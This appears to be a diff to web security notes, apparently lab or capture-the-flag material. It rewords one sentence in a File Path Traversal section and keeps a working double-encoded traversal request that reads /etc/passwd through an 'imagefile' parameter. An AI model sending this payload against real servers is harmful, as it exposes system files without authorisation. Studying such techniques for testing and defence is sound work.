@@ -1102,7 +1102,7 @@ grep 'Update email'
 
 ## File Path Traversal
 
->The imagefile parameter is vulnerable to path traversal attacks, enabling read access to arbitrary files on the server.
+>The imagefile parameter is vulnerable to directory traversal path attacks, enabling read access to arbitrary files on the server.
 
 ```html
 GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
